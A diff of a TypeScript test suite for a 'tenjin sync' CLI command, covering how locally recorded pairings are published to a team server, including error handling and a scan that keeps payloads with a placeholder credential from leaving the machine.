-    expect((sent[0]!.body!.keys as Array<{ key: string }>)[0]!.key).toBe('sig_v1:fine-symlinked');
+    expect(sent[0]!.body!.primary).toEqual({ kind: 'error', key: 'fine-symlinked' });
   });
+});
 
-  it('sends verified:true on the keys when the pairing closed as verified', async () => {
+describe('tenjin sync: the publish scan', () => {
+  it('keeps a row whose payload carries a credential on the machine, marked synced and skipped', async () => {
     await writeTeamConfig();
-    await seedPairing({ cwd: dir, key: 'fine-verified', status: 'verified' });
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer();
-
-    await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    const keys = sent[0]!.body!.keys as Array<{ kind: string; verified?: boolean }>;
-    const fps = keys.filter((k) => k.kind === 'fingerprint');
-    expect(fps.length).toBeGreaterThan(0);
-    expect(fps.every((k) => k.verified === true)).toBe(true);
-  });
-
-  it('never sends a pairing outside code scope', async () => {
-    await writeTeamConfig();
-    await seedPairing({ cwd: dir, key: 'user-scoped', scope: 'user', status: 'unverified' });
-    await seedPairing({
+    const id = await seedPairing({
       cwd: dir,
-      key: 'ambiguous-scoped',
-      scope: 'ambiguous',
+      key: 'fine-secret',
+      // The scan reads the PAYLOAD now — files, heads, versions — because there
+      // is no rendered title or body any more.
+      fixFiles: ['config/AKIAIOSFODNN7EXAMPLE.ts'],
       status: 'unverified',
     });
     const { provider } = spyProvider();
@@ -739,337 +639,46 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
     const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
 
     expect(sent).toHaveLength(0);
-    expect(result.data).toMatchObject({ synced: 0 });
+    expect(result.data).toMatchObject({ synced: 0, skipped: 1 });
+    expect((await pairingRow(id)).synced_at).not.toBeNull();
   });
 });
 
-describe('tenjin sync: verified after an earlier sync', () => {
-  it('PUTs verified:true and re-stamps synced_at, without a second POST', async () => {
+describe('tenjin sync: failures that stop the run', () => {
+  it('rethrows a non-signing abort, leaves synced_at NULL, and records the error on the events row', async () => {
     await writeTeamConfig();
-    const past = Date.now() - 120_000;
-    const id = await seedPairing({
-      cwd: dir,
-      key: 'fine-promoted',
-      status: 'verified',
-      syncedAt: past,
-      closedAt: Date.now() - 1000, // AFTER syncedAt: the promotion happened later
-    });
-    // Seed the post-id mapping the earlier sync would have written.
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    store.run(STORE_SQL.setState, [
-      '',
-      'pairing_post:' + id,
-      JSON.stringify({
-        postId: '44444444-4444-4444-8444-444444444444',
-        origin: TEAM,
-        at: past,
-        own: true,
-      }),
-      past,
-    ]);
-    store.close();
-
+    const id = await seedPairing({ cwd: dir, key: 'fine-abort', status: 'unverified' });
     const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer();
+    const { fetch } = shelfServer(() => ({ status: 503, json: { error: 'unavailable' } }));
 
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(result.data).toMatchObject({ synced: 0, verified: 1 });
-    expect(sent).toHaveLength(1);
-    expect(sent[0]!.method).toBe('PUT');
-    expect(sent[0]!.url).toBe(`${TEAM}/api/posts/44444444-4444-4444-8444-444444444444`);
-    const keys = sent[0]!.body!.keys as Array<{ kind: string; verified?: boolean }>;
-    expect(keys.filter((k) => k.kind === 'fingerprint').every((k) => k.verified === true)).toBe(
-      true,
-    );
-
-    const row = await pairingRow(id);
-    expect(row.synced_at).not.toBe(past);
-  });
-});
-
-describe("tenjin sync: a pairing closed beside a teammate's post", () => {
-  /** The link the failure arm's team leg writes on a hit (no `own`), stamped
-   *  with the close the way closePairing leaves it. */
-  async function seedTeamLink(id: number, closedAt: number): Promise<void> {
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    store.run(STORE_SQL.setState, [
-      '',
-      'pairing_post:' + id,
-      JSON.stringify({
-        postId: 'teammate-post-7',
-        origin: TEAM,
-        at: closedAt - 5000,
-        closedAt,
-        status: 'unverified',
-        fixFiles: ['widget.ts'],
-      }),
-      closedAt,
-    ]);
-    store.close();
-  }
-
-  it("POSTs this machine's own record with verified keys and never PUTs on the teammate's post", async () => {
-    await writeTeamConfig();
-    const closedAt = Date.now() - 1000;
-    const id = await seedPairing({
-      cwd: dir,
-      key: 'fine-second-close',
-      status: 'unverified',
-      closedAt,
+    await expect(runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch })).rejects.toMatchObject({
+      code: 'PUBLISH_FAILED',
     });
-    await seedTeamLink(id, closedAt);
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer();
-
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(result.data).toMatchObject({ synced: 1, verified: 0, held: 0, skipped: 0 });
-    expect(sent).toHaveLength(1);
-    expect(sent[0]!.method).toBe('POST');
-    expect(sent[0]!.url).toBe(`${TEAM}/api/posts`);
-    const keys = sent[0]!.body!.keys as Array<{ kind: string; verified?: boolean }>;
-    expect(keys.filter((k) => k.kind === 'fingerprint').every((k) => k.verified === true)).toBe(
-      true,
-    );
-
-    const row = await pairingRow(id);
-    expect(row.synced_at).not.toBeNull();
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    const link = store.get(STORE_SQL.getState, ['', 'pairing_post:' + id]) as { value: string };
-    store.close();
-    expect(JSON.parse(link.value)).toMatchObject({
-      postId: '11111111-1111-4111-8111-111111111111',
-      own: true,
-    });
-  });
-
-  it("is held, and the run continues, when the teammate's post already holds the key verified", async () => {
-    await writeTeamConfig();
-    const closedAt = Date.now() - 1000;
-    const first = await seedPairing({
-      cwd: dir,
-      key: 'fine-held-second',
-      status: 'unverified',
-      closedAt,
-    });
-    await seedTeamLink(first, closedAt);
-    const second = await seedPairing({ cwd: dir, key: 'fine-behind-it', status: 'unverified' });
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer((req) => {
-      const keys = (req.body?.keys ?? []) as Array<{ key: string }>;
-      if (keys.some((k) => k.key === 'sig_v1:fine-held-second')) {
-        return {
-          status: 400,
-          json: {
-            error: {
-              message: 'validation failed',
-              details: {
-                fieldErrors: {
-                  keys: ['fingerprint key is already verified on post teammate-post-7'],
-                },
-              },
-            },
-          },
-        };
-      }
-      return {
-        status: 201,
-        json: {
-          id: '22222222-2222-4222-8222-222222222222',
-          slug: 's',
-          title: 't',
-          status: 'published',
-          price: '0',
-          url: `${TEAM}/a/t/s`,
-          tags: [],
-        },
-      };
-    });
-
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(result.data).toMatchObject({ synced: 1, verified: 0, held: 1 });
-    expect(sent).toHaveLength(2);
-    expect((await pairingRow(first)).synced_at).not.toBeNull();
-    expect((await pairingRow(second)).synced_at).not.toBeNull();
-  });
-});
-
-describe('tenjin sync: a 404 on the update of our own post', () => {
-  it('marks the row synced and skipped, and reaches the rows behind it', async () => {
-    await writeTeamConfig();
-    const past = Date.now() - 120_000;
-    const gone = await seedPairing({
-      cwd: dir,
-      key: 'fine-gone',
-      status: 'verified',
-      syncedAt: past,
-      closedAt: Date.now() - 1000,
-    });
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    store.run(STORE_SQL.setState, [
-      '',
-      'pairing_post:' + gone,
-      JSON.stringify({
-        postId: '55555555-5555-4555-8555-555555555555',
-        origin: TEAM,
-        at: past,
-        own: true,
-      }),
-      past,
-    ]);
-    store.close();
-    const behind = await seedPairing({ cwd: dir, key: 'fine-behind-404', status: 'unverified' });
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer((req) =>
-      req.method === 'PUT'
-        ? { status: 404, json: { error: { code: 'post_not_found', message: 'not found' } } }
-        : {
-            status: 201,
-            json: {
-              id: '33333333-3333-4333-8333-333333333333',
-              slug: 's',
-              title: 't',
-              status: 'published',
-              price: '0',
-              url: `${TEAM}/a/t/s`,
-              tags: [],
-            },
-          },
-    );
-
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(result.data).toMatchObject({ synced: 1, verified: 0, held: 0, skipped: 1, pending: 0 });
-    expect(sent.map((r) => r.method)).toEqual(['PUT', 'POST']);
-    expect((await pairingRow(gone)).synced_at).not.toBe(past);
-    expect((await pairingRow(behind)).synced_at).not.toBeNull();
-  });
-});
-
-describe('tenjin sync: the publish scan', () => {
-  it('keeps a row whose body carries a credential on the machine, marked synced and skipped', async () => {
-    await writeTeamConfig();
-    // The credential rides in `fixFiles` (`Changed: ...` in the body), not
-    // `cmd` or `fixCmd`: tenjin-agent#252 (PR 277 review) swapped both the
-    // `Failed:` line to `cmdHead` and the `Passed on:` line to a head derived
-    // from `fixCmd`, so a secret sitting only in either full scrubbed command
-    // line no longer reaches the body this scan reads at all — this test is
-    // about the scan catching what IS synced, not about a specific field.
-    const leaky = await seedPairing({
-      cwd: dir,
-      key: 'fine-leaky',
-      fixFiles: ['AKIAIOSFODNN7EXAMPLE.ts'],
-      status: 'unverified',
-    });
-    const clean = await seedPairing({ cwd: dir, key: 'fine-clean', status: 'unverified' });
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer();
-
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(result.data).toMatchObject({ synced: 1, skipped: 1, pending: 0 });
-    expect(sent).toHaveLength(1);
-    expect(JSON.stringify(sent[0]!.body)).not.toContain('AKIA');
-    expect((await pairingRow(leaky)).synced_at).not.toBeNull();
-    expect((await pairingRow(clean)).synced_at).not.toBeNull();
-  });
-});
-
-describe('tenjin sync: an abort that is not a signing failure', () => {
-  it('rethrows, leaves synced_at NULL, and records the error (not a code) on the events row', async () => {
-    await writeTeamConfig();
-    const id = await seedPairing({ cwd: dir, key: 'fine-outage', status: 'unverified' });
-    const { provider } = spyProvider();
-    const { fetch } = shelfServer(() => ({ status: 503, json: { error: 'down' } }));
-
-    await expect(runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch })).rejects.toBeInstanceOf(
-      CliError,
-    );
-
     expect((await pairingRow(id)).synced_at).toBeNull();
+
     const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    const eventRow = store.get(
-      "SELECT data FROM events WHERE hook = 'sync' ORDER BY at DESC LIMIT 1",
-      [],
-    ) as { data: string } | null;
-    store.close();
-    expect(eventRow).not.toBeNull();
-    const data = JSON.parse(eventRow!.data) as Record<string, unknown>;
-    expect(typeof data.error).toBe('string');
+    const row = store!.get(STORE_SQL.lastSyncEvent, []) as { data: string };
+    store!.close();
+    const data = JSON.parse(row.data) as Record<string, unknown>;
+    expect(data.error).toBe('PUBLISH_FAILED');
     expect(data.code).toBeUndefined();
   });
-});
 
-describe('tenjin sync: a verified-holder 400', () => {
-  it('marks the row synced (never retried) and records the holder, without throwing', async () => {
+  it('exits with the coded error on a signing failure and writes an events row hook: sync', async () => {
     await writeTeamConfig();
-    const id = await seedPairing({ cwd: dir, key: 'fine-collides', status: 'verified' });
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer(() => ({
-      status: 400,
-      json: {
-        error: {
-          message: 'validation failed',
-          details: {
-            fieldErrors: {
-              keys: ['fingerprint key is already verified on post teammate-post-99'],
-            },
-          },
-        },
-      },
-    }));
-
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(sent).toHaveLength(1);
-    expect(result.data).toMatchObject({ synced: 0, verified: 0, held: 1 });
-    const row = await pairingRow(id);
-    expect(row.synced_at).not.toBeNull();
-
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    const link = store.get(STORE_SQL.getState, ['', 'pairing_post:' + id]) as {
-      value: string;
-    } | null;
-    store.close();
-    expect(link).not.toBeNull();
-    expect(JSON.parse(link!.value)).toMatchObject({ postId: 'teammate-post-99', held: true });
-  });
-});
-
-describe('tenjin sync: a signing failure', () => {
-  it('exits with the coded error, leaves synced_at NULL, and writes an events row hook: sync', async () => {
-    await writeTeamConfig();
-    const id = await seedPairing({ cwd: dir, key: 'fine-locked', status: 'unverified' });
+    const id = await seedPairing({ cwd: dir, key: 'fine-signing', status: 'unverified' });
     const { fetch, sent } = shelfServer();
 
     await expect(
       runSync(ctx(), { cwd: dir, provider: lockedProvider(), fetchImpl: fetch }),
     ).rejects.toMatchObject({ code: 'PUBLISH_FAILED' });
 
-    // Never reached the network: the signer failed before headersFor could sign.
     expect(sent).toHaveLength(0);
-
-    const row = await pairingRow(id);
-    expect(row.synced_at).toBeNull();
-
+    expect((await pairingRow(id)).synced_at).toBeNull();
     const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    const eventRow = store.get(
-      "SELECT hook, data FROM events WHERE hook = 'sync' ORDER BY at DESC LIMIT 1",
-      [],
-    ) as { hook: string; data: string } | null;
-    store.close();
-    expect(eventRow).not.toBeNull();
-    const data = JSON.parse(eventRow!.data) as { code: string };
-    expect(data.code).toBe('USAGE');
+    const row = store!.get(STORE_SQL.lastSyncEvent, []) as { data: string };
+    store!.close();
+    expect(JSON.parse(row.data)).toMatchObject({ code: 'USAGE' });
   });
 });
 
@@ -1078,112 +687,9 @@ describe('tenjin sync: nothing to do', () => {
     await writeTeamConfig();
     const { provider } = spyProvider();
     const { fetch, sent } = shelfServer();
-
     const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
     expect(sent).toHaveLength(0);
-    expect(result.data).toMatchObject({ synced: 0, verified: 0, held: 0 });
-  });
-});
-
-describe('tenjin sync: the link write fails', () => {
-  /** Make every `pairing_post:` write abort inside SQLite, which is what
-   *  `store.run` swallows into a `false` — a disk-full store, a locked one, a
-   *  constraint. Only that one key: the rest of the run writes normally, so
-   *  this proves the stamp was skipped BECAUSE the link failed and not because
-   *  the store stopped working. */
-  async function breakLinkWrites(): Promise<void> {
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    store.run(
-      `CREATE TRIGGER no_pairing_link BEFORE INSERT ON session_state
-         WHEN NEW.key LIKE 'pairing_post:%'
-         BEGIN SELECT RAISE(ABORT, 'link write failed'); END`,
-      [],
-    );
-    store.close();
-  }
-
-  async function fixLinkWrites(): Promise<void> {
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    store.run('DROP TRIGGER no_pairing_link', []);
-    store.close();
-  }
-
-  it('leaves synced_at NULL so the row re-publishes, rather than stranding it', async () => {
-    await writeTeamConfig();
-    const id = await seedPairing({
-      cwd: dir,
-      key: 'fine-hash-nolink',
-      cmdHead: 'pnpm',
-      cmd: 'pnpm test',
-      status: 'unverified',
-    });
-    await breakLinkWrites();
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer();
-
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    // The POST happened — the piece is on the shelf — but nothing local claims
-    // it, so the row must still look unsynced.
-    expect(sent).toHaveLength(1);
-    expect(sent[0]!.method).toBe('POST');
-    expect(result.data).toMatchObject({ synced: 0, verified: 0, held: 0, skipped: 0, pending: 1 });
-    expect((await pairingRow(id)).synced_at).toBeNull();
-
-    // A synced row with no link is the state that can never be promoted: no id
-    // to PUT the verified keys on, and no unsynced row for a later run to pick
-    // up. Neither half is here.
-    const store = await openStore(dir);
-    if (store === null) throw new Error('no store');
-    const link = store.get('SELECT value FROM session_state WHERE key = ?', [`pairing_post:${id}`]);
-    store.close();
-    expect(link).toBeNull();
-
-    // And the next run does the thing being preserved: publishes again (the
-    // shelf dedups), links, and stamps.
-    await fixLinkWrites();
-    const second = shelfServer();
-    const again = await runSync(ctx(), { cwd: dir, provider, fetchImpl: second.fetch });
-    expect(second.sent).toHaveLength(1);
-    expect(again.data).toMatchObject({ synced: 1 });
-    expect((await pairingRow(id)).synced_at).not.toBeNull();
-  });
-
-  it('does not stamp a held row whose holder link failed to write', async () => {
-    await writeTeamConfig();
-    const id = await seedPairing({
-      cwd: dir,
-      key: 'fine-held-nolink',
-      cmdHead: 'pnpm',
-      cmd: 'pnpm test',
-      status: 'unverified',
-    });
-    await breakLinkWrites();
-    const { provider } = spyProvider();
-    // The verified-holder 400: a teammate's published piece already holds the
-    // fingerprint, so the run records who holds it and stamps. With the link
-    // write broken it must do neither.
-    const { fetch, sent } = shelfServer(() => ({
-      status: 400,
-      json: {
-        error: {
-          message: 'validation failed',
-          details: {
-            fieldErrors: {
-              keys: ['fingerprint key is already verified on post teammate-post-3'],
-            },
-          },
-        },
-      },
-    }));
-
-    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(sent).toHaveLength(1);
-    expect(result.data).toMatchObject({ held: 0, synced: 0, pending: 1 });
-    expect((await pairingRow(id)).synced_at).toBeNull();
+    expect(result.data).toMatchObject({ synced: 0, attested: 0, skipped: 0 });
+    expect(result.humanLines).toEqual(['Nothing to sync.']);
   });
 });
